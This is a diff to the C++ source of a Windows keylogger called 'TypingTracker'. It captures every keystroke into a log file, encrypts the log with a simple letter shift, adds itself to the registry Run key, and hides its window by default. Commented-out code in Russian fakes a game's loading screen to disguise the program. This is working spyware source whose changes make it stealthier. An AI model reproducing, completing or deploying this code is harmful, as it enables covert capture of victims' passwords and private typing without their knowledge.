@@ -9,7 +9,7 @@
 /* Copyright © 2018 Dionysus Benstein. All rights reserved.        */
 
 /* Description: The main file that defines the entry point for	   */
-/*				the application.                   
+/*				the application.
 
 /*******************************************************************/
 
@@ -19,12 +19,12 @@
 #include <string>
 #include <time.h>
 
-#define VISIBLE_UI //Macros for UI conditional compilation  
+//#define VISIBLE_UI //Macros for UI conditional compilation
 
 //using namespace std;
 
 bool is_capslock = false;
-int backspace = 0;    
+int backspace = 0;
 std::string high_en_alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 std::string low_en_alph = "abcdefghijklmnopqrstuvwxyz";
 std::string high_ru_alph = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ";
@@ -36,114 +36,104 @@ std::string encryptLogs(const std::string str, const int key)
 {
 	std::string output;
 
-//Посимвольное прохождение по введённой строке
-for (int i = 0; i < str.length(); ++i)
-{
-	//Если в введённой строке встречается пробел, то он остаётся неизменённым
-	if (str[i] == ' ')
+	for (int i = 0; i < str.length(); ++i)
 	{
-		output += ' ';
-	}
-
-	//Посимвольное прохождение по английскому алфавиту в верхнем регистре
-	for (int j = 0; j < high_en_alph.length(); ++j)
-	{
-		if (high_en_alph[j] == str[i]) //Нахождение совпадений в алфавите
+		if (str[i] == ' ')
 		{
-			if ((j + key) > 25) //Проверка на выход за границы массива
+			output += ' ';
+		}
+
+		for (int j = 0; j < high_en_alph.length(); ++j)
+		{
+			if (high_en_alph[j] == str[i])
 			{
-				//Сдвиг индекса в начало алфавита
-				output += high_en_alph[(j - 26) + key];
+				if ((j + key) > 25)
+				{
+					output += high_en_alph[(j - 26) + key];
+				}
+				else
+				{
+					output += high_en_alph[j + key];
+				}
 			}
-			else
+		}
+
+		for (int j = 0; j < low_en_alph.length(); ++j)
+		{
+			if (low_en_alph[j] == str[i])
 			{
-				//Сдвиг j-элемента на key позиций вправо
-				output += high_en_alph[j + key];
+				if ((j + key) > 25)
+				{
+					output += low_en_alph[(j - 26) + key];
+				}
+				else
+				{
+					output += low_en_alph[j + key];
+				}
+			}
+		}
+
+		for (int j = 0; j < high_ru_alph.length(); ++j)
+		{
+			if (high_ru_alph[j] == str[i])
+			{
+				if ((j + key) > 32)
+				{
+					output += high_ru_alph[(j - 33) + key];
+				}
+				else
+				{
+					output += high_ru_alph[j + key];
+				}
+			}
+		}
+
+		for (int j = 0; j < low_ru_alph.length(); ++j)
+		{
+			if (low_ru_alph[j] == str[i])
+			{
+				if ((j + key) > 32)
+				{
+					output += low_ru_alph[(j - 33) + key];
+				}
+				else
+				{
+					output += low_ru_alph[j + key];
+				}
+			}
+		}
+
+		for (int j = 0; j < signs.length(); ++j)
+		{
+			if (signs[j] == str[i])
+			{
+				if ((j + key) > 29)
+				{
+					output += signs[(j - 30) + key];
+				}
+				else
+				{
+					output += signs[j + key];
+				}
+			}
+		}
+
+		for (int j = 0; j < numbers.length(); ++j)
+		{
+			if (numbers[j] == str[i])
+			{
+				if ((j + key) > 9)
+				{
+					output += numbers[(j - 10) + key];
+				}
+				else
+				{
+					output += numbers[j + key];
+				}
 			}
 		}
 	}
-
-	//Посимвольное прохождение по английскому алфавиту в нижнем регистре
-	for (int j = 0; j < low_en_alph.length(); ++j)
-	{
-		if (low_en_alph[j] == str[i])
-		{
-			if ((j + key) > 25)
-			{
-				output += low_en_alph[(j - 26) + key];
-			}
-			else
-			{
-				output += low_en_alph[j + key];
-			}
-		}
-	}
-
-	//Посимвольное прохождение по русскому алфавиту в верхнем регистре
-	for (int j = 0; j < high_ru_alph.length(); ++j)
-	{
-		if (high_ru_alph[j] == str[i])
-		{
-			if ((j + key) > 32)
-			{
-				output += high_ru_alph[(j - 33) + key];
-			}
-			else
-			{
-				output += high_ru_alph[j + key];
-			}
-		}
-	}
-
-	//Посимвольное прохождение по русскому алфавиту в нижнем регистре
-	for (int j = 0; j < low_ru_alph.length(); ++j)
-	{
-		if (low_ru_alph[j] == str[i])
-		{
-			if ((j + key) > 32)
-			{
-				output += low_ru_alph[(j - 33) + key];
-			}
-			else
-			{
-				output += low_ru_alph[j + key];
-			}
-		}
-	}
-
-	//Посимвольное прохождение по строчке со знаками
-	for (int j = 0; j < signs.length(); ++j)
-	{
-		if (signs[j] == str[i])
-		{
-			if ((j + key) > 29)
-			{
-				output += signs[(j - 30) + key];
-			}
-			else
-			{
-				output += signs[j + key];
-			}
-		}
-	}
-
-	//Посимвольное прохождение по строчке с цифрами
-	for (int j = 0; j < numbers.length(); ++j)
-	{
-		if (numbers[j] == str[i])
-		{
-			if ((j + key) > 9)
-			{
-				output += numbers[(j - 10) + key];
-			}
-			else
-			{
-				output += numbers[j + key];
-			}
-		}
-	}
-}
-return output;
+	return output;
 }
 
 int save(const int key)
@@ -153,10 +143,10 @@ int save(const int key)
 	out_file.open("logs.txt", std::ios_base::app);
 	std::string sLogs = "";
 	time_t t = time(0);
-	
+
 	switch (key)
 	{
-	//Numeric keyboard
+		//Numeric keyboard
 	case 96:
 		::backspace = 0;
 		sLogs += "0";
@@ -198,7 +188,7 @@ int save(const int key)
 		sLogs += "9";
 		break;
 
-	//Top keyboard
+		//Top keyboard
 	case 48:
 		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
@@ -310,7 +300,7 @@ int save(const int key)
 		}
 		break;
 
-	//Inputting a set of letters from the keyboard
+		//Inputting a set of letters from the keyboard
 	case 65:
 		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
@@ -464,7 +454,7 @@ int save(const int key)
 		break;
 	case 75:
 		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "K";
 		}
@@ -475,9 +465,9 @@ int save(const int key)
 		break;
 	case 76:
 		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#321";
 			}
@@ -486,13 +476,13 @@ int save(const int key)
 				sLogs += "L";
 			}
 		}
-		else 
+		else
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&322";
 			}
-			else 
+			else
 			{
 				sLogs += "l";
 			}
@@ -504,7 +494,7 @@ int save(const int key)
 		{
 			sLogs += "M";
 		}
-		else 
+		else
 		{
 			sLogs += "m";
 		}
@@ -517,19 +507,19 @@ int save(const int key)
 			{
 				sLogs += "&#323";
 			}
-			else 
+			else
 			{
 				sLogs += "N";
 			}
 			break;
 		}
-		else 
+		else
 		{
 			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#324";
 			}
-			else 
+			else
 			{
 				sLogs += "n";
 			}
@@ -537,9 +527,9 @@ int save(const int key)
 		break;
 	case 79:
 		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#211";
 			}
@@ -549,13 +539,13 @@ int save(const int key)
 			}
 			break;
 		}
-		else 
+		else
 		{
 			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#243";
 			}
-			else 
+			else
 			{
 				sLogs += "o";
 			}
@@ -563,7 +553,7 @@ int save(const int key)
 		break;
 	case 80:
 		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "P";
 			break;
@@ -601,11 +591,11 @@ int save(const int key)
 		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#346";
 			}
-			else 
+			else
 			{
 				sLogs += "S";
 			}
@@ -613,7 +603,7 @@ int save(const int key)
 		}
 		else
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#347";
 			}
@@ -642,13 +632,13 @@ int save(const int key)
 			sLogs += "U";
 			break;
 		}
-		else 
+		else
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "ˆ";
 			}
-			else 
+			else
 			{
 				sLogs += "u";
 			}
@@ -680,20 +670,20 @@ int save(const int key)
 		break;
 	case 88:
 		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#377";
 			}
-			else 
+			else
 			{
 				sLogs += "X";
 			}
 			break;
 		}
 		else {
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#378";
 			}
@@ -705,7 +695,7 @@ int save(const int key)
 		break;
 	case 89:
 		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "Y";
 			break;
@@ -740,14 +730,14 @@ int save(const int key)
 				sLogs += "z";
 			}
 		}
-	//Decimal key codes
+		//Decimal key codes
 	case 13:
 		::backspace = 0;
 		sLogs += "\n";
 		break;
 	case 20:
 		::backspace = 0;
-		if (::is_capslock == false) 
+		if (::is_capslock == false)
 		{
 			::is_capslock = true;
 			sLogs += " [CapsLock] ";
@@ -791,8 +781,8 @@ int save(const int key)
 		break;
 	}
 
-	out_file << sLogs; 
-	out_file.close();  
+	out_file << encryptLogs(sLogs, 5);
+	out_file.close();
 
 	return 0;
 }
@@ -810,22 +800,90 @@ void addInAutorun()
 	HKEY hKey;
 	char szPath[0x100];
 	GetModuleFileName(NULL, szPath, sizeof(szPath));
-	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-				   NULL, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
-				   nullptr, &hKey, nullptr);
+	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		NULL, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+		nullptr, &hKey, nullptr);
 
 	if (hKey)
 	{
 		RegSetValueEx(hKey, "", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath));
 		RegCloseKey(hKey);
 	}
-}   
+}
 
-int main(int argc, char *argv[]) 
+int main(int argc, char *argv[])
 {
+	#ifndef VISIBLE_UI
+	stealth();
+
+	//setlocale(LC_ALL, "Russian");
+
+	////Emulation UI
+	//std::cout << "Car-Inside v0.2.6-alpha1\n" << std::endl;
+	//std::cout << "Привет";
+	//Sleep(200);
+	//std::cout << "."; 
+	//Sleep(200);
+	//std::cout << ".";
+	//Sleep(200);
+	//std::cout << ".\n\n";
+
+	//std::cout << "\tВнимаение!" << std::endl;
+	//std::cout << " В папке, которая является хранилищем для исполняемого файла этой программы\n"
+	//	" появится текстовый документ 'logs.txt' (например, если исполняемый файл сохранен на рабочем столе, то\n"
+	//	" текстовый документ 'logs.txt' появится там же), в случае ошибки\n"
+	//	" ТЕКСТОВЫЙ ДОКУМЕНТ УДАЛЯТЬ КРАЙНЕ НЕ РЕКОМЕНДУЕТСЯ.\n"
+	//	" Этот файл необходим разработчику для исправления ошибок.\n"
+	//	"\tСпасибо за внимание!\n" << std::endl;
+
+	//std::cout << "Нажмите Enter, чтобы продолжить..." << std::endl;
+	//std::getchar();
+
+	//std::cout << "Counting 3D objects..." << std::endl;
+	//Sleep(100);
+	//std::cout << "Counting 3D objects, done.\n" << std::endl;
+	//Sleep(1000);
+
+	//std::cout << "Counting particle..." << std::endl;
+	//Sleep(200);
+	//std::cout << "Counting particle, done.\n" << std::endl;
+	//Sleep(500);
+
+	//std::cout << "Loading shaders..." << std::endl;
+	//Sleep(300);
+	//std::cout << "Loading shaders, done.\n" << std::endl;
+	//Sleep(1000);
+
+	//std::cout << "Loading scripts engine..." << std::endl;
+	//Sleep(100);
+	//std::cout << "Loading scripts engine, done.\n" << std::endl;
+	//Sleep(100);
+
+	//std::cout << "Loading sound engine..." << std::endl;
+	//Sleep(100);
+	//std::cout << "Loading sound engine, done.\n" << std::endl;
+	//Sleep(150);
+
+	//std::cout << "Loading physic engine..." << std::endl;
+	//Sleep(100);
+	//std::cout << "Loading physic engine, done.\n" << std::endl;
+	//Sleep(111);
+
+	//std::cout << "Loading collision detection system..." << std::endl;
+	//Sleep(100);
+	//std::cout << "Loading collision detection system, done.\n" << std::endl;
+	//Sleep(100);
+
+	//std::cout << "Loading 3D-models..." << std::endl;
+	//Sleep(100);
+	//std::cout << "\aERR_FILE_NOT_FOUND" << std::endl;
+	//Sleep(100);
+
+	#endif //VISIBLE_UI
+
 	#ifdef VISIBLE_UI
 	//UI for interactions with application display mode
-	std::cout << "TypingTracker v0.2.5\n" << std::endl;
+	std::cout << "TypingTracker v0.2.6\n" << std::endl;
 
 	unsigned short int display_mode;
 	std::cout << "Display mode 1 - visible window, 0 - hidden window" << std::endl;
@@ -844,17 +902,13 @@ int main(int argc, char *argv[])
 	}
 	#endif //VISIBLE_UI
 
-	#ifndef VISIBLE_UI
-	stealth();
-	#endif //VISIBLE_UI
-
 	addInAutorun();
 
 	char buffer[MAX_PATH];
 	::GetModuleFileNameA(NULL, buffer, MAX_PATH);
 
 	char i;
-	while (true) 
+	while (true)
 	{
 		for (i = 8; i <= 190; i++)
 		{
